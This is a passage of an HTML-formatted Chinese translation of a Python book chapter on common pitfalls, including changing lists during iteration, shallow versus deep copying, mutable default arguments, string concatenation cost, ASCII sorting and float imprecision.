       newGreetings.append(word)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>greetings = newGreetings <span class="hljs-comment"># 替换原来的列表</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(greetings)<br>[<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>]<br></code></pre></td></tr></table></figure><p>　　这段代码只是一个用来创建列表的简单循环，通过列表推导式也可以做到。列表推导式在运行速度和内存使用上并不占优势，但可以在不损失可读性的前提下尽可能缩短打字时间。在交互式shell中输入上一个示例的等效代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>greetings = [<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;mello&#x27;</span>, <span class="hljs-string">&#x27;yello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>greetings = [word <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> greetings <span class="hljs-keyword">if</span> word == <span class="hljs-string">&#x27;hello&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(greetings)<br>[<span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>]<br></code></pre></td></tr></table></figure><p>　　列表推导式不仅更简洁，还避免了在迭代时修改列表所引发的“陷阱”</p><blockquote><p><strong>引用、内存使用和<code>sys.getsizeof()</code></strong></p><p>　　创建一个新列表看起来比修改原有列表更消耗内存。但是，正如变量包含的只是值的引用而非实际值，列表包含的也是值的引用。在前面的代码中，<code>newGreetings.append(word)</code>并没有复制<code>word</code>变量中的字符串，而只是复制了对该字符串的引用。相比之下，这个引用比实际的字符串小很多。</p><p>　　使用<code>sys.getsizeof()</code>函数可以证实这一点。该函数的返回值是参数对象在内存中占用的字节数。在这个交互式shell示例中，可以看到短字符串<code>&#39;cat&#39;</code>占用了52字节，而长字符串占用了85字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="hljs-string">&#x27;cat&#x27;</span>)<br><span class="hljs-number">52</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>sys.getsizeof(<span class="hljs-string">&#x27;a much longer string than just &quot;cat&quot;&#x27;</span>)<br><span class="hljs-number">85</span><br></code></pre></td></tr></table></figure><p>　　在我使用的Python版本中，字符串对象固有的开销占49字节，而字符串中每个实际字符再占用1字节。但包含了任意字符串的列表只占用72字节，无论字符串有多长。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sys.getsizeof([<span class="hljs-string">&#x27;cat&#x27;</span>])<br><span class="hljs-number">72</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>sys.getsizeof([<span class="hljs-string">&#x27;a much longer string than just &quot;cat&quot;&#x27;</span>])<br><span class="hljs-number">72</span><br></code></pre></td></tr></table></figure><p>　　原因在于，从技术原理上讲，列表并不包含字符串，而只包含对字符串的引用。无论引用的数据有多大，引用本身的大小是一样的。像<code>newGreetings.append(word)</code>这样的代码并不是在复制<code>word</code>中的字符串，而是复制对字符串的引用。Python核心开发者Raymond Hettinger编写了一个函数，可以用来了解一个对象及其引用的全部对象占用的内存。</p><p>　　所以你不必觉得与迭代列表时对其进行修改相比，创建新列表会浪费内存。即使在修改迭代列表时不出错，它也可能隐藏着某些不易察觉的bug，需要很长时间才能排查和修复。程序员的时间要比计算机的内存值钱得多。</p></blockquote><p>　　虽然在迭代列表（或者任何可迭代对象）时不应该从中增删元素，但修改列表的某项内容是被允许的。比如有一个字符串形式的数字列表<code>[&#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;]</code>，我们可以在迭代列表的同时将其转换成整数列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>numbers = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i, number <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(numbers):<br><span class="hljs-meta">... </span>    numbers[i] = <span class="hljs-built_in">int</span>(number)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>numbers<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br></code></pre></td></tr></table></figure><p>　　修改列表中的元素是可以的，改变列表中的元素个数才容易导致问题。</p><h2 id="8-2-复制可变值时务必使用copy-copy-和copy-deepcopy"><a href="#8-2-复制可变值时务必使用copy-copy-和copy-deepcopy" class="headerlink" title="8.2　复制可变值时务必使用copy.copy()和copy.deepcopy()"></a>8.2　复制可变值时务必使用<code>copy.copy()</code>和<code>copy.deepcopy()</code></h2><p>　　最好把变量看作指向对象的标签或者代号，而不是包含对象的盒子。这种模型在涉及修改可变对象时特别有用，比如列表、字典和集合等对象的值是可以改变的。一个常见的错误是复制指向某个对象的变量到另一个变量时，误以为是在复制实际的对象。在Python中，赋值语句从来都不会复制对象，而只会复制对象的引用。关于这个问题，Python开发者Ned Batchelder在PyCon 2015上发表了一场精彩的演讲，题为“Facts and Myths about Python Names and Values”（关于Python名称和值的事实与谬误）。</p><p>　　来看一个示例。在交互式shell中输入以下代码，需要注意的是，尽管我们只改变了<code>spam</code>变量，但<code>cheese</code>变量也发生了变化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>spam = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>cheese = spam<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam<br>[<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>cheese<br>[<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam[<span class="hljs-number">2</span>] = <span class="hljs-string">&#x27;MOOSE&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>spam<br>[<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;MOOSE&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>cheese<br>[<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;MOOSE&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(cheese), <span class="hljs-built_in">id</span>(spam)<br><span class="hljs-number">2356896337288</span>, <span class="hljs-number">2356896337288</span><br></code></pre></td></tr></table></figure><p>　　如果误认为<code>cheese = spam</code>复制了<code>list</code>对象，那么你可能会惊讶于尽管只修改了<code>spam</code>，但<code>cheese</code>也发生了变化。赋值语句从来不复制对象，而只复制对象的引用。赋值语句<code>cheese = spam</code>使<code>cheese</code>在计算机内存中引用了与<code>spam</code>相同的列表对象，而非复制了列表对象。这就是改变了<code>spam</code>，<code>cheese</code>也随之改变的原因：两个变量指向了同一个列表对象。</p><p>　　同样的原则也适用于作为函数调用参数的可变对象。在交互式shell中输入以下内容，注意全局变量<code>spam</code>和局部变量，参数（参数是在函数的<code>def</code>语句中定义的变量）<code>theList</code>指向同一个对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">printIdOfParam</span>(<span class="hljs-params">theList</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(theList))<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>eggs = [<span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;eel&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(eggs))<br><span class="hljs-number">2356893256136</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>printIdOfParam(eggs)<br><span class="hljs-number">2356893256136</span><br></code></pre></td></tr></table></figure><p>　　注意<code>id(eggs)</code>和<code>id(theList)</code>返回的身份是一样的，意味着这两个变量指向同一个列表对象。<code>eggs</code>变量对应的列表对象并没有被复制到<code>theList</code>中，而是复制了对象的引用。一个引用只有几字节大小。假设Python复制了列表而非引用，会如何呢？如果<code>eggs</code>不止3项，而有10亿项，那么把它传递给<code>printIdOfParam()</code>时需要复制这个巨大的列表。仅仅是一个简单的函数调用，就将消耗几千兆字节的内存。这就是Python赋值只复制引用而不复制对象的原因。</p><p>　　如果你真的想复制这个列表对象（而不仅仅是引用），那么一个可行的方案是使用<code>copy.copy()</code>函数复制对象。在交互式shell中输入以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> copy<br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon = [<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>ham = copy.copy(bacon)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(bacon), <span class="hljs-built_in">id</span>(ham)<br>(<span class="hljs-number">2356896337352</span>, <span class="hljs-number">2356896337480</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;CHANGED&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon<br>[<span class="hljs-string">&#x27;CHANGED&#x27;</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>ham<br>[<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(bacon), <span class="hljs-built_in">id</span>(ham)<br>(<span class="hljs-number">2356896337352</span>, <span class="hljs-number">2356896337480</span>)<br></code></pre></td></tr></table></figure><p>　　<code>ham</code>变量指向了复制的列表对象，而非<code>bacon</code>所指向的原始列表对象，所以不会因为复制引用而导致错误。</p><p>　　但正如之前的比喻所解释的，变量像是标签而非包含对象的盒子，列表包含的也是指向对象的标签而非实际的对象。如果列表中嵌套了其他列表，那么<code>copy.copy()</code>只会复制被嵌套列表项的引用。在交互式shell中输入以下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> copy<br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]]<br><span class="hljs-meta">&gt;&gt;&gt; </span>ham = copy.copy(bacon)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(bacon), <span class="hljs-built_in">id</span>(ham)<br>(<span class="hljs-number">2356896466248</span>, <span class="hljs-number">2356896375368</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon.append(<span class="hljs-string">&#x27;APPENDED&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon<br>[[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-string">&#x27;APPENDED&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>ham<br>[[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]]<br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;CHANGED&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>bacon<br>[[<span class="hljs-string">&#x27;CHANGED&#x27;</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-string">&#x27;APPENDED&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>ham<br>[[<span class="hljs-string">&#x27;CHANGED&#x27;</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(bacon[<span class="hljs-number">0</span>]), <span class="hljs-built_in">id</span>(ham[<span class="hljs-number">0</span>])<br>(<span class="hljs-number">2356896337480</span>, <span class="hljs-number">2356896337480</span>)<br></code></pre></td></tr></table></figure><p>　　虽然<code>bacon</code>和<code>ham</code>是不同的列表对象，但它们都包含了两个同样的内部列表<code>[1, 2]</code>和<code>[3, 4]</code>。使用<code>copy.copy()</code>并不能处理这种情况1，正确的方法是使用<code>copy.deepcopy()</code>，它将复制列表对象内部的子列表对象（假如子列表还有子列表，也会层层递归）。在交互式shell中输入以下内容：</p><p>1它只能返回最外层对象的副本。——译者注</p><h2 id="8-3-不要用可变值作为默认参数"><a href="#8-3-不要用可变值作为默认参数" class="headerlink" title="8.3　不要用可变值作为默认参数"></a>8.3　不要用可变值作为默认参数</h2><p>Python允许为函数设置默认参数。当用户没有明确设定参数时，函数将使用默认参数执行。当函数的大多数调用使用相同的参数时，默认参数很有用，因为用户在某些情况下可以不必填写参数。比如在<code>split()</code>方法中传递<code>None</code>会使它在遇到空白字符时进行分割。<code>None</code>也是<code>split()</code>函数的默认参数：调用<code>&#39;cat dog&#39;.split()</code>等效于调用<code>&#39;cat dog&#39;.split(None)</code>。如果调用者不传入参数，函数就会使用对应的默认参数。</p><p>　　但永远不要把一个可变对象（比如列表或者字典）设置为默认参数，因为它很容易导致错误。下面的例子进行了说明。这段代码定义了一个<code>addIngredient()</code>函数，它的作用是为一个代表三明治的列表添加某种调料字符串。因为这个列表的最前和最后一项通常是<code>&#39;bread&#39;</code>，所以它使用了可变列表<code>[&#39;bread&#39;, &#39;bread&#39;]</code>作为默认参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">addIngredient</span>(<span class="hljs-params">ingredient, sandwich=[<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;bread&#x27;</span>]</span>):<br><span class="hljs-meta">... </span>    sandwich.insert(<span class="hljs-number">1</span>, ingredient)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> sandwich<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>mySandwich = addIngredient(<span class="hljs-string">&#x27;avocado&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>mySandwich<br>[<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;avocado&#x27;</span>, <span class="hljs-string">&#x27;bread&#x27;</span>]<br></code></pre></td></tr></table></figure><p>　　但使用像<code>[&#39;bread&#39;, &#39;bread&#39;]</code>列表这种可变对象作为默认参数会导致一个不易察觉的问题：这个列表是在函数的<code>def</code>语句执行时被创建的2，而不是在每次函数调用时被创建的。这意味着只有一个<code>[&#39;bread&#39;, &#39;bread&#39;]</code>列表对象被创建，因为我们只定义了一次<code>addIngredient()</code>函数。每次调用函数都会重复使用同一个列表，这就导致了意想不到的行为，比如下面这种情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>mySandwich = addIngredient(<span class="hljs-string">&#x27;avocado&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>mySandwich<br>[<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;avocado&#x27;</span>, <span class="hljs-string">&#x27;bread&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>anotherSandwich = addIngredient(<span class="hljs-string">&#x27;lettuce&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>anotherSandwich<br>[<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;lettuce&#x27;</span>, <span class="hljs-string">&#x27;avocado&#x27;</span>, <span class="hljs-string">&#x27;bread&#x27;</span>]<br></code></pre></td></tr></table></figure><p>　　因为<code>addIngredient(&#39;lettuce&#39;)</code>使用了与之前调用相同的默认参数列表，而这个默认参数已经加入了<code>&#39;avocado&#39;</code>，所以这个函数返回的并不是预想的<code>[&#39;bread&#39;, &#39;lettuce&#39;, &#39;bread&#39;]</code>，而是<code>[&#39;bread&#39;, &#39;lettuce&#39;, &#39;avocado&#39;, &#39;bread&#39;]</code>。<code>&#39;avocado&#39;</code>字符串在新的调用结果中又出现了，因为<code>sandwich</code>参数的列表与上一次调用时是同一个。由于<code>def</code>语句只执行了一次，所以<code>[&#39;bread&#39;, &#39;bread&#39;]</code>列表只被创建了一次，而非每次函数调用时都会创建一个新的列表。</p><p>当需要列表或者字典作为默认参数时，Python的解决方法是将默认参数设置为<code>None</code>，然后通过代码检查参数是否为<code>None</code>，如果是，则在函数每次调用时提供一个新的列表或者字典。这么做可以确保每次调用函数时都创建一个新的可变对象，而不是只在定义时创建一次，比如下面这个示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">addIngredient</span>(<span class="hljs-params">ingredient,sandwich=<span class="hljs-literal">None</span></span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">if</span> sandwich <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br><span class="hljs-meta">... </span>        sandwich = [<span class="hljs-string">&#x27;bread&#x27;</span>,<span class="hljs-string">&#x27;bread&#x27;</span>]<br><span class="hljs-meta">... </span>    sandwich.insert(<span class="hljs-number">1</span>,ingredient)<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> sandwich<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>firstSandwich = addIngredient(<span class="hljs-string">&#x27;cranberries&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>firstSandwich<br>[<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;cranberries&#x27;</span>, <span class="hljs-string">&#x27;bread&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>secondSandwich = addIngredient(<span class="hljs-string">&#x27;lettuce&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>secondSandwich<br>[<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;lettuce&#x27;</span>, <span class="hljs-string">&#x27;bread&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(firstSandwich) == <span class="hljs-built_in">id</span>(secondSandwich)<br><span class="hljs-literal">False</span> ❶<br></code></pre></td></tr></table></figure><p>　　注意，<code>firstSandwich</code>和<code>secondSandwich</code>并不共享相同的列表引用❶，这是因为<code>sandwich = [&#39;bread&#39;, &#39;bread&#39;]</code>这行代码在每次调用<code>addIngredient()</code>时都会创建一个新的列表对象，而不是仅在函数定义时创建一次。</p><p>　　可变数据类型包括列表、字典、集合，以及由类语句创建的对象，不要把这些类型的对象作为<code>def</code>语句中的默认参数。</p><h2 id="8-4-不要通过字符串连接创建字符串"><a href="#8-4-不要通过字符串连接创建字符串" class="headerlink" title="8.4　不要通过字符串连接创建字符串"></a>8.4　不要通过字符串连接创建字符串</h2><p>在Python中，字符串是不可变的对象。这意味着字符串值不能被改变，那些看起来像是修改字符串的代码实际上都是在创建一个新的字符串对象。比如，下面的操作改变了<code>spam</code>变量的内容，并非是通过改变字符串的值，而是用一个新的具有不同身份的字符串值替换了它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>spam = <span class="hljs-string">&#x27;Hello&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(spam), spam<br>(<span class="hljs-number">38330864</span>, <span class="hljs-string">&#x27;Hello&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam = spam + <span class="hljs-string">&#x27; world!&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(spam), spam<br>(<span class="hljs-number">38329712</span>, <span class="hljs-string">&#x27;Hello world!&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam = spam.upper()<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(spam), spam<br>(<span class="hljs-number">38329648</span>, <span class="hljs-string">&#x27;HELLO WORLD!&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam = <span class="hljs-string">&#x27;Hi&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(spam), spam<br>(<span class="hljs-number">38395568</span>, <span class="hljs-string">&#x27;Hi&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>spam = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;spam&#125;</span> world!&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">id</span>(spam), spam<br>(<span class="hljs-number">38330864</span>, <span class="hljs-string">&#x27;Hi world!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>　　注意，每次调用<code>id(spam)</code>都返回了一个不同的身份，因为<code>spam</code>中的字符串对象并不是被修改了，而是被一个全新的、拥有不同身份的字符串对象取代了。通过使用f-string、字符串的<code>format()</code>方法或者<code>%s</code>格式标识符跟使用<code>+</code>进行字符串拼接一样，都会创建新的字符串对象。这一点通常无关紧要。Python是一种高级程序语言，它处理了许多类似的细节，以便你专注程序开发而非技术细节。</p><p>但使用大量的字符串连接构建字符串会使你的程序变慢。循环的每一次迭代都会创建一个新的字符串对象，并丢弃旧的字符串对象。这种代码一般是<code>for</code>或<code>while</code>循环内的字符串连接，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>finalString = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):<br><span class="hljs-meta">... </span>    finalString += <span class="hljs-string">&#x27;spam &#x27;</span><br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>finalString<br>spam spam spam spam spam spam spam spam spam spam spam spam --snip--<br></code></pre></td></tr></table></figure><p>　　因为<code>finalString += &#39;spam&#39;</code>在循环中重复执行了100 000次，所以Python进行了100 000次字符串连接。CPU需要做的工作是：连接当前<code>finalString</code>和<code>&#39;spam&#39;</code>以创建一个临时字符串，将其放在内存里，在下一个迭代中又立即丢掉它。这做了大量的无用功，因为我们只关心最终的字符串，并不关心临时字符串。</p><p>通过<code>append</code>形成列表的方法要比字符串连接的方法快10倍（第13章介绍了如何测量程序的运行速度）。<code>for</code>循环的迭代次数越多，两者的速度差异就越大。当<code>range(100000)</code>改为<code>range(100)</code>测量时，尽管字符串连接法还是比列表添加法慢，但差异微乎其微。不必每次都坚决避免使用字符串连接、f-string、字符串<code>format()</code>方法或<code>%s</code>格式标识符。只有在进行大量的字符串连接时，使用它们才会明显变慢。</p><p>　　Python能够让程序员不必考虑底层细节，从而能更快地编写软件。正如前面提到的，程序员的时间比CPU的时间宝贵得多。但在有些情况下，了解一些细节（比如了解不可变的字符串和可变的列表之间的区别）是有必要的，它可以避免你坠入“陷阱”，比如使用连接方法来创建字符串这种并不聪明的做法。</p><h2 id="8-5-不要指望sort-按照字母顺序排序"><a href="#8-5-不要指望sort-按照字母顺序排序" class="headerlink" title="8.5　不要指望sort()按照字母顺序排序"></a>8.5　不要指望<code>sort()</code>按照字母顺序排序</h2><p>美国信息交换标准代码（ASCII，发音为ask-ee）是文本字符与数字代码（被称为<strong>码位</strong>或序号）之间的映射。<code>sort()</code>方法采用ASCII-betical排序方法（一个常见术语，意为按照序号排序）而非字母序。在ASCII系统中，“A”用码位65表示，“B”用66表示，以此类推，直到“Z”用90表示。小写字母“a”则由码位97表示，“b”由98表示，以此类推，直到“z”由122表示。当按ASCII进行排序时，大写字母“Z”（码位90）排在小写字母“a”（码位97）之前。</p><h2 id="8-6-不要假设浮点数是完全准确的"><a href="#8-6-不要假设浮点数是完全准确的" class="headerlink" title="8.6　不要假设浮点数是完全准确的"></a>8.6　不要假设浮点数是完全准确的</h2><p>计算机只能存储二进制数字，也就是1和0。为了表示人类熟悉的十进制数字，我们需要将3.14这类数字转换成二进制的0和1的序列。根据电气电子工程师学会（IEEE，发音为eye triple-ee）发布的IEEE 754标准，计算机将做这样的转换。为了方便使用，这些细节对程序员是隐藏的，可以直接输入带有小数点的十进制数字，不必关心十进制数字到二进制数字的转换过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0.3</span><br><span class="hljs-number">0.3</span><br></code></pre></td></tr></table></figure><p>　　浮点数的IEEE 754表示法并不总是与十进制的数字完全等同。虽然对具体示例进行详细讲解超出了本书的范围，但还是在这里举一个经典示例——0.1问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 